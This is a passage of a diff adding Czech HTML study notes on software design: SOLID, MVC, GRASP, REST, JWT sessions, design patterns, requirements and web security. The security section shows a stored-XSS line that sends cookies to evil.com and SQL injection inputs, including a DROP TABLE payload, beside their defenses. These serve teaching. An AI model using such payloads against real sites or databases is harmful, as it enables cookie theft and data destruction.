+                    <p><em>Příklad:</em> <code>OrderService</code> závisí na <code>PaymentProcessor</code> interface, ne na <code>StripePayment</code> přímo → snadno zaměnitelné, testovatelné.</p>
+
+                    <div class="summary-box"><strong>Shrnutí SOLID:</strong><ul>
+                        <li><strong>S</strong>: jeden důvod ke změně.</li>
+                        <li><strong>O</strong>: rozšiřuj přidáváním, ne modifikací.</li>
+                        <li><strong>L</strong>: podtřídy plně zaměnitelné za nadtřídy.</li>
+                        <li><strong>I</strong>: malá specializovaná rozhraní.</li>
+                        <li><strong>D</strong>: závisej na abstrakcích.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-14">
+                    <h3>14. Liskov Substitution Principle (LSP) – detailně</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Pokud slíbíš, že jsi „Pták", musíš umět létat. Podtřída musí splnit <em>všechny</em> sliby nadtřídy – nejen syntakticky, ale i chováním.</div>
+                    <div class="def-box"><strong>Definice (Barbara Liskov, 1987):</strong> Pokud je S podtypem T, pak objekty T mohou být v programu <strong>nahrazeny objekty S bez změny správného chování programu</strong>.</div>
+                    <h4>Podtřída nesmí:</h4>
+                    <ul>
+                        <li><strong>Zpřísnit preconditions</strong> – vstupní podmínky nemohou být přísnější než u rodiče</li>
+                        <li><strong>Oslabit postconditions</strong> – výstup musí splňovat alespoň záruky rodiče</li>
+                        <li><strong>Porušit invarianty</strong> – vnitřní konzistence musí být zachována</li>
+                        <li><strong>Vyhodit nové výjimky</strong>, které rodič nevyhazuje</li>
+                    </ul>
+                    <div class="ex-box"><strong>Příklad 1 – Rectangle vs. Square:</strong>
+<pre><code>class Rectangle {
+    int width, height;
+    void setWidth(int w)  { width = w; }
+    void setHeight(int h) { height = h; }
+    int area() { return width * height; }
+}
+class Square extends Rectangle {
+    @Override void setWidth(int w)  { width = height = w; }   // !!!
+    @Override void setHeight(int h) { width = height = h; }   // !!!
+}
+void test(Rectangle r) {
+    r.setWidth(5); r.setHeight(3);
+    assert r.area() == 15;  // selže pro Square (5*5=25)!
+}</code></pre>
+                        <p><strong>Oprava:</strong> Preferuj kompozici nebo společný interface <code>Shape</code>.</p>
+                    </div>
+                    <div class="ex-box"><strong>Příklad 2 – Bird vs. Penguin:</strong>
+<pre><code>class Bird { void fly() { /* letí */ } }
+class Penguin extends Bird {
+    @Override void fly() { throw new UnsupportedOperationException(); }
+}
+// Kód volající bird.fly() selže pro Penguin → LSP porušeno</code></pre>
+                        <p><strong>Oprava:</strong> Odděl <code>FlyingBird</code> interface od obecného <code>Bird</code>.</p>
+                    </div>
+                    <div class="warn-box"><strong>Upozornění:</strong> IS-A vztah musí platit i <strong>behaviorálně</strong>, nejen strukturálně. „Čtverec geometricky je obdélník" neznamená, že <code>Square extends Rectangle</code> je bezpečné.</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>LSP: podtřídy musí být plně zaměnitelné – i chováním, nejen typem.</li>
+                        <li>Nesmí zpřísnit preconditions, oslabit postconditions, porušit invarianty.</li>
+                        <li>Klasická porušení: Rectangle/Square, Bird/Penguin.</li>
+                        <li>Oprava: přehodnoť hierarchii nebo použij kompozici.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-15">
+                    <h3>15. MVC – rozdíl od vrstevnaté architektury</h3>
+                    <div class="insight-box"><strong>Insight:</strong> MVC je vzor pro UI kód. Vrstevnatá architektura je způsob, jak rozdělit celou aplikaci. MVC žije uvnitř prezentační vrstvy třívrstvé architektury.</div>
+                    <div class="def-box"><strong>MVC – Model-View-Controller:</strong><ul>
+                        <li><strong>Model</strong> – data a byznys logika; nezávislý na UI</li>
+                        <li><strong>View</strong> – prezentace dat uživateli (HTML šablona); neobsahuje logiku</li>
+                        <li><strong>Controller</strong> – přijímá vstupy, manipuluje modelem, vybírá view</li>
+                    </ul></div>
+                    <div class="ex-box"><strong>Tok MVC:</strong>
+<pre><code>Uživatel → Controller → Model (aktualizace)
+                          Model → View (renderování)
+                          View  → Uživatel</code></pre>
+                    </div>
+                    <table class="table table-bordered summary-table">
+                        <thead><tr><th>Aspekt</th><th>MVC</th><th>Třívrstvá architektura</th></tr></thead>
+                        <tbody>
+                            <tr><td>Typ</td><td>Návrhový vzor (UI pattern)</td><td>Architektonický styl</td></tr>
+                            <tr><td>Zaměření</td><td>Organizace UI interakcí</td><td>Oddělení celé aplikace</td></tr>
+                            <tr><td>Vrstvy</td><td>Model, View, Controller</td><td>Prezentace, Byznys, Data</td></tr>
+                            <tr><td>Vztah</td><td>Controller ≈ Prezentační vrstva</td><td>Byznys + DAO jsou pod MVC</td></tr>
+                        </tbody>
+                    </table>
+                    <div class="ex-box"><strong>Vztah v praxi:</strong>
+<pre><code>[Browser] ↔ [Controller] ↔ [Service] ↔ [DAO] ↔ [DB]
+           ←── MVC ────→ ←── Třívrstvá architektura ──→</code></pre>
+                    </div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>MVC = vzor pro UI (Model, View, Controller).</li>
+                        <li>Třívrstvá architektura = celý systém (Prezentace, Byznys, Data).</li>
+                        <li>MVC je součástí prezentační vrstvy třívrstvé architektury – nejsou alternativy.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-16">
+                    <h3>16. GRASP principy – High Cohesion, Low Coupling</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Cohesion = jak pevně třída drží pohromadě. Coupling = kolik drátů ji spojuje s ostatními. Cíl: pevné třídy, tenké dráty.</div>
+                    <div class="def-box"><strong>GRASP</strong> (General Responsibility Assignment Software Patterns) – 9 principů pro přiřazení zodpovědností. Autor: Craig Larman.</div>
+                    <h4>High Cohesion (Vysoká soudržnost)</h4>
+                    <div class="def-box"><strong>Metody a atributy třídy spolu logicky souvisejí; třída má jasně ohraničenou zodpovědnost.</strong></div>
+                    <div class="ex-box">
+                        <p><strong>Nízká soudržnost (špatně):</strong> <code>UserManager</code> s <code>saveUser()</code>, <code>sendEmail()</code>, <code>generateReport()</code>, <code>computeTax()</code></p>
+                        <p><strong>Vysoká soudržnost (dobře):</strong> <code>UserRepository</code> (jen persistuje), <code>EmailService</code> (jen emaily), <code>TaxCalculator</code> (jen daně)</p>
+                    </div>
+                    <h4>Low Coupling (Nízká provázanost)</h4>
+                    <div class="def-box"><strong>Třída závisí na co nejméně jiných třídách; změna jedné neovlivní mnoho dalších.</strong></div>
+                    <div class="ex-box">
+                        <p><strong>Vysoké coupling (špatně):</strong> <code>OrderService</code> vytváří <code>MySQLDatabase</code>, <code>StripePayment</code>, <code>SmtpEmailSender</code> přímo</p>
+                        <p><strong>Nízké coupling (dobře):</strong> <code>OrderService</code> závisí na interface <code>Database</code>, <code>PaymentProcessor</code>, <code>EmailSender</code> → implementace je zaměnitelná</p>
+                    </div>
+                    <div class="thm-box"><strong>Vztah:</strong> High Cohesion a Low Coupling se vzájemně podporují – soudržná třída má přirozeně méně závislostí.</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>GRASP = 9 principů přiřazení zodpovědností (Craig Larman).</li>
+                        <li>High Cohesion: třída dělá jednu věc, vše k sobě patří.</li>
+                        <li>Low Coupling: minimální závislosti; závisíme na abstrakcích.</li>
+                        <li>Výsledek: maintainable, testovatelný, rozšiřitelný kód.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-17">
+                    <h3>17. REST architektonický styl – principy, CRUD, HATEOAS</h3>
+                    <div class="insight-box"><strong>Insight:</strong> REST není protokol ani formát – je to soubor omezení pro návrh webových služeb. Klíč: každý zdroj má URL, komunikace je bezstavová.</div>
+                    <div class="def-box"><strong>Definice:</strong> REST (Representational State Transfer) – architektonický styl definovaný Royem Fieldingem (2000). Systém splňující REST principy = <em>RESTful</em>.</div>
+                    <h4>6 principů REST</h4>
+                    <ol>
+                        <li><strong>Client-Server</strong> – oddělení UI od datové logiky</li>
+                        <li><strong>Stateless</strong> – každý požadavek nese veškerý kontext; server nedrží stav klienta</li>
+                        <li><strong>Cacheable</strong> – odpovědi mohou být kešovány</li>
+                        <li><strong>Uniform Interface</strong> – konzistentní přístup přes URL a HTTP metody</li>
+                        <li><strong>Layered System</strong> – klient neví, zda komunikuje přímo nebo přes proxy</li>
+                        <li><strong>Code on Demand</strong> (volitelné) – server posílá spustitelný kód (JS)</li>
+                    </ol>
+                    <h4>CRUD ↔ HTTP metody</h4>
+                    <table class="table table-bordered summary-table">
+                        <thead><tr><th>CRUD</th><th>HTTP</th><th>Příklad URL</th><th>Idempotentní?</th></tr></thead>
+                        <tbody>
+                            <tr><td>Create</td><td>POST</td><td><code>POST /users</code></td><td>Ne</td></tr>
+                            <tr><td>Read</td><td>GET</td><td><code>GET /users/42</code></td><td>Ano</td></tr>
+                            <tr><td>Update (full)</td><td>PUT</td><td><code>PUT /users/42</code></td><td>Ano</td></tr>
+                            <tr><td>Update (partial)</td><td>PATCH</td><td><code>PATCH /users/42</code></td><td>Závisí</td></tr>
+                            <tr><td>Delete</td><td>DELETE</td><td><code>DELETE /users/42</code></td><td>Ano</td></tr>
+                        </tbody>
+                    </table>
+                    <h4>HATEOAS</h4>
+                    <div class="def-box"><strong>HATEOAS</strong> (Hypermedia as the Engine of Application State) – odpověď obsahuje <strong>linky na další akce</strong>; klient nemusí znát strukturu API předem.</div>
+                    <div class="ex-box"><strong>Příklad HATEOAS odpovědi:</strong>
+<pre><code>{
+  "id": 42, "name": "Adam",
+  "_links": {
+    "self":   { "href": "/users/42" },
+    "orders": { "href": "/users/42/orders" },
+    "delete": { "href": "/users/42", "method": "DELETE" }
+  }
+}</code></pre>
+                    </div>
+                    <div class="warn-box"><strong>Upozornění:</strong> HATEOAS je součástí REST specifikace, ale v praxi ho většina API ignoruje ve prospěch dokumentace (OpenAPI/Swagger).</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>REST = 6 principů (stateless, uniform interface, cacheable…).</li>
+                        <li>CRUD ↔ HTTP: GET/POST/PUT/PATCH/DELETE.</li>
+                        <li>HATEOAS: odpovědi obsahují linky na další možné akce.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-18">
+                    <h3>18. Stavovost server-client komunikace</h3>
+                    <div class="insight-box"><strong>Insight:</strong> HTTP je bezstavový protokol. Stav klienta musíme explicitně uložit – buď na klienta (JWT), nebo na server (session). Obojí má trade-offs.</div>
+                    <div class="def-box"><ul>
+                        <li><strong>Stateless</strong> – každý požadavek je samostatný; server si nepamatuje předchozí interakce. Příklad: REST API s JWT.</li>
+                        <li><strong>Stateful</strong> – server drží kontext klienta mezi požadavky. Příklad: tradiční <code>HttpSession</code>.</li>
+                    </ul></div>
+                    <table class="table table-bordered summary-table">
+                        <thead><tr><th>Metoda</th><th>Kde je stav</th><th>Výhody</th><th>Nevýhody</th></tr></thead>
+                        <tbody>
+                            <tr><td>Cookie + Server Session</td><td>Session ID v cookie; stav na serveru</td><td>Jednoduché, httpOnly cookie</td><td>Sdílená session (Redis) pro škálování</td></tr>
+                            <tr><td>JWT Token</td><td>Klient nese veškerý stav</td><td>Škálovatelné, žádná server-side session</td><td>Token nelze zneplatnit před expirací</td></tr>
+                            <tr><td>localStorage</td><td>Klientský prohlížeč</td><td>Persistentní</td><td>Zranitelné XSS útokem</td></tr>
+                            <tr><td>URL parametry</td><td>URL</td><td>Sdílitelné</td><td>Nezabezpečené pro citlivá data</td></tr>
+                        </tbody>
+                    </table>
+                    <div class="ex-box"><strong>JWT flow:</strong>
+<pre><code>1. POST /login { username, password }
+   → Server vrátí JWT token (podepsaný)
+
+2. GET /orders
+   Headers: Authorization: Bearer &lt;token&gt;
+   → Server ověří podpis, přečte claims (userId…)
+   → Žádný DB lookup – vše je v tokenu</code></pre>
+                    </div>
+                    <div class="warn-box"><strong>Upozornění:</strong> Stateless ≠ žádný stav. Stav existuje, jen je přesunut na klienta nebo do sdíleného úložiště. Výhoda: lze přidat libovolný počet serverů – každý obslouží libovolného klienta.</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>HTTP je stateless; stav řešíme cookie/JWT/URL.</li>
+                        <li>Session (server-side): jednodušší bezpečnost, složitější škálování.</li>
+                        <li>JWT (client-side): snadné škálování, problém s invalidací.</li>
+                        <li>Stateless REST = horizontálně škálovatelný.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-19">
+                    <h3>19. Bezpečnost – XSS a SQL injection</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Oba útoky stojí na stejném principu: útočník <em>vloží kód tam, kde se očekávají data</em>. Obrana: nikdy nevěř vstupu – vždy validuj a escapuj.</div>
+                    <h4>XSS – Cross-Site Scripting</h4>
+                    <div class="def-box"><strong>Definice:</strong> Útočník vloží škodlivý JavaScript do stránky, který se spustí v prohlížeči ostatních uživatelů.</div>
+                    <ul>
+                        <li><strong>Reflected XSS</strong> – kód je v URL/požadavku; oběť musí kliknout na speciální odkaz</li>
+                        <li><strong>Stored/Persistent XSS</strong> – kód je uložen na serveru (komentář, profil) a zobrazí se <em>všem</em> automaticky. <strong>Nebezpečnější!</strong></li>
+                        <li><strong>DOM-based XSS</strong> – útok probíhá pouze v prohlížeči, server se neúčastní</li>
+                    </ul>
+                    <div class="ex-box"><strong>Příklad Stored XSS:</strong>
+<pre><code>// Útočník vloží do komentáře:
+&lt;script&gt;fetch('https://evil.com/?c=' + document.cookie)&lt;/script&gt;
+// Server uloží bez sanitizace → zobrazí všem → ukradne cookies</code></pre>
+                    </div>
+                    <div class="thm-box"><strong>Obrana proti XSS:</strong><ul>
+                        <li>Escapovat výstup do HTML (<code>&lt;</code> → <code>&amp;lt;</code>)</li>
+                        <li><strong>Content Security Policy (CSP)</strong> – prohlížeč odmítne inline skripty</li>
+                        <li>Cookies s flagem <code>httpOnly</code> (JS k nim nemá přístup)</li>
+                        <li>Frameworky auto-escapující výstup (React, Vue, Thymeleaf)</li>
+                    </ul></div>
+                    <h4>SQL Injection</h4>
+                    <div class="def-box"><strong>Definice:</strong> Útočník vloží SQL kód do vstupního pole, čímž změní původní SQL dotaz a získá neoprávněný přístup k DB.</div>
+                    <div class="ex-box"><strong>Příklad:</strong>
+<pre><code>// Zranitelný kód:
+String sql = "SELECT * FROM users WHERE name='" + userInput + "'";
+
+// Vstup: ' OR '1'='1
+// Výsledek: SELECT * FROM users WHERE name='' OR '1'='1'
+// → Vrátí VŠECHNY uživatele!
+
+// Horší varianta: admin'; DROP TABLE users; --</code></pre>
+                    </div>
+                    <div class="thm-box"><strong>Obrana proti SQL injection:</strong><ul>
+                        <li><strong>Prepared statements / Parametrizované dotazy</strong> (nejúčinnější): <code>WHERE name = ?</code></li>
+                        <li>ORM (JPA/Hibernate) – automaticky parametrizuje</li>
+                        <li>Validace a whitelisting vstupů</li>
+                        <li>Princip nejnižších oprávnění – DB uživatel nesmí <code>DROP TABLE</code></li>
+                    </ul></div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>XSS: vložení JS do stránky; Stored XSS (persistent) je nejnebezpečnější.</li>
+                        <li>SQL injection: vložení SQL do vstupu, mění dotaz.</li>
+                        <li>Obrana XSS: escapování výstupu, CSP, httpOnly.</li>
+                        <li>Obrana SQL: prepared statements, ORM, nejnižší oprávnění.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-20">
+                    <h3>20. Funkcionální programování – map, filter, reduce (MapReduce)</h3>
+                    <div class="insight-box"><strong>Insight:</strong> FP: transformuj data bez mutace originálu. map/filter/reduce jsou základní operace nad kolekcemi; MapReduce rozšiřuje totéž na distribuované Big Data.</div>
+                    <h4>Klíčové koncepty FP</h4>
+                    <ul>
+                        <li><strong>Pure functions</strong> – stejný vstup = stejný výstup, žádné side effects</li>
+                        <li><strong>Immutability</strong> – data se nemění, vytváří se nová</li>
+                        <li><strong>Higher-order functions</strong> – funkce jako parametry a návratové hodnoty</li>
+                    </ul>
+                    <div class="def-box"><strong>map / filter / reduce:</strong><ul>
+                        <li><strong>map(f)</strong> – aplikuje f na každý prvek → kolekce stejné délky</li>
+                        <li><strong>filter(predikát)</strong> – vrátí jen prvky splňující podmínku</li>
+                        <li><strong>reduce(f, init)</strong> – agreguje kolekci na jednu hodnotu</li>
+                    </ul></div>
+                    <div class="ex-box"><strong>Java 8 Streams:</strong>
+<pre><code>List&lt;Integer&gt; nums = List.of(1, 2, 3, 4, 5, 6);
+
+List&lt;Integer&gt; squares = nums.stream()
+    .map(n -&gt; n * n)             // [1, 4, 9, 16, 25, 36]
+    .collect(Collectors.toList());
+
+List&lt;Integer&gt; evens = nums.stream()
+    .filter(n -&gt; n % 2 == 0)     // [2, 4, 6]
+    .collect(Collectors.toList());
+
+int sum = nums.stream()
+    .reduce(0, Integer::sum);    // 21</code></pre>
+                    </div>
+                    <h4>MapReduce (Big Data)</h4>
+                    <div class="def-box"><strong>MapReduce</strong> – distribuovaný model zpracování dat (Google/Hadoop). Fáze: <strong>Map</strong> → <strong>Shuffle</strong> → <strong>Reduce</strong>.</div>
+                    <div class="ex-box"><strong>Příklad – počítání slov:</strong>
+<pre><code>// Map: každé slovo → (slovo, 1)
+"hello world hello" → [(hello,1), (world,1), (hello,1)]
+
+// Shuffle: seskup podle klíče
+hello → [1,1],  world → [1]
+
+// Reduce: součet
+hello → 2,  world → 1</code></pre>
+                        <p>Map fáze běží paralelně na všech nodech; Reduce agreguje výsledky.</p>
+                    </div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>FP: pure functions, immutability, higher-order functions.</li>
+                        <li>map = transformace; filter = výběr; reduce = agregace.</li>
+                        <li>Java 8+: Stream API; Python: vestavěné funkce.</li>
+                        <li>MapReduce (Hadoop): distribuovaný vzor Map→Shuffle→Reduce.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-21">
+                    <h3>21. Observer návrhový vzor</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Observer = novinový odběr. Vydavatel neví, kdo odebírá. Odběratelé reagují na každou změnu automaticky – bez poolingu.</div>
+                    <div class="def-box"><strong>Definice:</strong> Observer (publish-subscribe) – behaviorální vzor, závislost <strong>jeden-k-mnoha</strong>. Změna stavu subjektu → automatická notifikace všech registrovaných pozorovatelů.</div>
+                    <div class="ex-box"><strong>Příklad:</strong>
+<pre><code>interface Observer { void update(String event); }
+
+class EventSource {
+    private List&lt;Observer&gt; observers = new ArrayList&lt;&gt;();
+    void subscribe(Observer o)   { observers.add(o); }
+    void unsubscribe(Observer o) { observers.remove(o); }
+    void changeState(String s) {
+        // ... interní změna ...
+        observers.forEach(o -&gt; o.update(s));
+    }
+}
+
+class Logger implements Observer {
+    public void update(String e) { System.out.println("Log: " + e); }
+}
+
+EventSource src = new EventSource();
+src.subscribe(new Logger());
+src.changeState("userLoggedIn");  // → "Log: userLoggedIn"</code></pre>
+                    </div>
+                    <p><strong>Reálné příklady:</strong> Java <code>EventListener</code>, JS <code>addEventListener</code>, Spring <code>@EventListener</code>, React state → překreslení komponent.</p>
+                    <div class="warn-box"><strong>Memory leak:</strong> Observer bez <code>unsubscribe()</code> zůstane v paměti subjektu jako „zombie" reference. Vždy zajisti odhlášení při zániku observeru.</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Publish-subscribe: jeden subjekt → mnoho pozorovatelů.</li>
+                        <li>Loose coupling: subjekt nezná konkrétní typy observers.</li>
+                        <li>Metody: subscribe, unsubscribe, notify.</li>
+                        <li>Riziko: memory leak při zapomenutém unsubscribe.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-22">
+                    <h3>22. Iterator návrhový vzor</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Iterator = standardní způsob procházení kolekce. Klient iteruje přes <code>hasNext/next</code> a neví, zda je uvnitř pole, seznam, strom nebo síťový stream.</div>
+                    <div class="def-box"><strong>Definice:</strong> Iterator – behaviorální vzor poskytující <strong>sekvenční přístup k prvkům kolekce bez odhalení její interní reprezentace</strong>.</div>
+                    <div class="ex-box"><strong>Java interface a použití:</strong>
+<pre><code>// java.util.Iterator&lt;T&gt;
+interface Iterator&lt;T&gt; {
+    boolean hasNext();
+    T next();
+    void remove();  // volitelně
+}
+
+Iterator&lt;String&gt; it = someCollection.iterator();
+while (it.hasNext()) { System.out.println(it.next()); }</code></pre>
+                    </div>
+                    <div class="ex-box"><strong>Vlastní Iterator – číselný rozsah:</strong>
+<pre><code>class NumberRange implements Iterable&lt;Integer&gt; {
+    int from, to;
+    NumberRange(int f, int t) { from=f; to=t; }
+    public Iterator&lt;Integer&gt; iterator() {
+        return new Iterator&lt;Integer&gt;() {
+            int cur = from;
+            public boolean hasNext() { return cur &lt;= to; }
+            public Integer next()    { return cur++; }
+        };
+    }
+}
+for (int n : new NumberRange(1, 5)) System.out.print(n + " ");
+// 1 2 3 4 5</code></pre>
+                    </div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Sekvenční přístup ke kolekci bez znalosti interní struktury.</li>
+                        <li>Interface: <code>hasNext()</code> + <code>next()</code>.</li>
+                        <li>Java: <code>Iterable</code> + <code>Iterator</code> → umožňuje <code>for-each</code>.</li>
+                        <li>Různé kolekce sdílejí jednotný traversal interface.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-23">
+                    <h3>23. Visitor návrhový vzor</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Visitor odděluje „co s daty dělat" od „jak jsou data uložena". Přidáváš nové operace bez nutnosti měnit existující datové třídy.</div>
+                    <div class="def-box"><strong>Definice:</strong> Visitor – behaviorální vzor, který <strong>odděluje algoritmus od objektové struktury</strong>. Nové operace přidáváme bez změny tříd elementů.</div>
+                    <h4>Princip – Double Dispatch</h4>
+                    <p>Element volá <code>accept(visitor)</code> → visitor volá <code>visit(this)</code>. Dvojité dynamické rozhodování: typ elementu + typ visitoru.</p>
+                    <div class="ex-box"><strong>Příklad – plocha různých tvarů:</strong>
+<pre><code>interface Shape        { void accept(ShapeVisitor v); }
+interface ShapeVisitor {
+    void visit(Circle c);
+    void visit(Rectangle r);
+}
+
+class Circle implements Shape {
+    double radius;
+    public void accept(ShapeVisitor v) { v.visit(this); }
+}
+class Rectangle implements Shape {
+    double w, h;
+    public void accept(ShapeVisitor v) { v.visit(this); }
+}
+
+// Nová operace BEZ změny Circle/Rectangle!
+class AreaVisitor implements ShapeVisitor {
+    double total = 0;
+    public void visit(Circle c)    { total += Math.PI * c.radius * c.radius; }
+    public void visit(Rectangle r) { total += r.w * r.h; }
+}
+
+List&lt;Shape&gt; shapes = List.of(new Circle(), new Rectangle());
+AreaVisitor av = new AreaVisitor();
+shapes.forEach(s -&gt; s.accept(av));
+System.out.println(av.total);</code></pre>
+                    </div>
+                    <div class="warn-box"><strong>Nevýhoda:</strong> Přidáš-li nový typ elementu, musíš aktualizovat <em>všechny</em> visitore. Vhodné jen pokud jsou typy stabilní, ale operace se mění.</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Odděluje operaci od datové struktury.</li>
+                        <li><code>accept(visitor)</code> → <code>visit(this)</code> = double dispatch.</li>
+                        <li>Snadno přidáváš operace; složitě přidáváš nové typy elementů.</li>
+                        <li>Reálné využití: AST traversal v kompilátorech, reportování.</li>
+                    </ul></div>
+                </section>
+
+                <section class="topic-section" id="topic-24">
+                    <h3>24. Požadavky na systém – typy</h3>
+                    <div class="insight-box"><strong>Insight:</strong> Funkční = co systém dělá. Nefunkční = jak dobře to dělá. Systémové = v jakých mezích pracuje. Špatně definované požadavky jsou nejčastější příčinou neúspěchu projektů.</div>
+
+                    <h4>Funkční požadavky (Functional Requirements)</h4>
+                    <div class="def-box"><strong>Definice:</strong> Popisují <strong>konkrétní chování a funkce</strong> systému.</div>
+                    <div class="ex-box"><strong>Příklady:</strong><ul>
+                        <li>„Systém umožní přihlásit se e-mailem a heslem."</li>
+                        <li>„Uživatel může filtrovat produkty podle ceny a kategorie."</li>
+                        <li>„Systém odešle potvrzovací e-mail do 5 minut od registrace."</li>
+                    </ul></div>
+
+                    <h4>Nefunkční požadavky (Non-Functional Requirements)</h4>
+                    <div class="def-box"><strong>Definice:</strong> Popisují <strong>kvalitativní vlastnosti</strong> systému – jak dobře vykonává funkce.</div>
+                    <table class="table table-bordered summary-table">
+                        <thead><tr><th>Kategorie</th><th>Příklad měřitelného požadavku</th></tr></thead>
+                        <tbody>
+                            <tr><td>Výkon</td><td>„API odpoví do 200 ms pro P99 požadavků."</td></tr>
+                            <tr><td>Dostupnost</td><td>„Systém dostupný 99,9 % času (max. 8,7 h výpadku/rok)."</td></tr>
+                            <tr><td>Škálovatelnost</td><td>„Zvládne 10 000 souběžných uživatelů."</td></tr>
+                            <tr><td>Bezpečnost</td><td>„Hesla uložena hashovaná (bcrypt)."</td></tr>
+                            <tr><td>Udržovatelnost</td><td>„Kódová základna má 80 % pokrytí testy."</td></tr>
+                            <tr><td>Použitelnost</td><td>„Registrace dokončena do 2 minut."</td></tr>
+                        </tbody>
+                    </table>
+
+                    <h4>Systémové / Omezující požadavky (Constraint Requirements)</h4>
+                    <div class="def-box"><strong>Definice:</strong> Technologická a provozní omezení, ve kterých musí systém pracovat.</div>
+                    <div class="ex-box"><strong>Příklady:</strong><ul>
+                        <li>„Systém musí běžet na JVM (Java 17+)."</li>
+                        <li>„Musí se integrovat se SAP ERP přes REST API."</li>
+                        <li>„Data musí být uložena v EU (GDPR)."</li>
+                        <li>„Deployment výhradně na AWS."</li>
+                    </ul></div>
+
+                    <div class="warn-box"><strong>Upozornění:</strong> Nefunkční požadavky musí být <strong>měřitelné</strong>. „Systém bude rychlý" je špatný požadavek. „Odpoví do 200 ms pro P99" je dobrý. Neměřitelné požadavky nelze ověřit ani testovat.</div>
+                    <div class="summary-box"><strong>Shrnutí:</strong><ul>
+                        <li>Funkční: co systém dělá (use cases, features).</li>
+                        <li>Nefunkční: jak dobře to dělá (výkon, bezpečnost, škálovatelnost).</li>
+                        <li>Systémové: v jakých mezích pracuje (platforma, integrace, legislativa).</li>
+                        <li>Nefunkční požadavky musí být měřitelné.</li>
+                    </ul></div>
+                </section>
+
+            </div><!-- /col-lg-9 -->
+        </div><!-- /row -->
+    </div><!-- /container -->
+
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
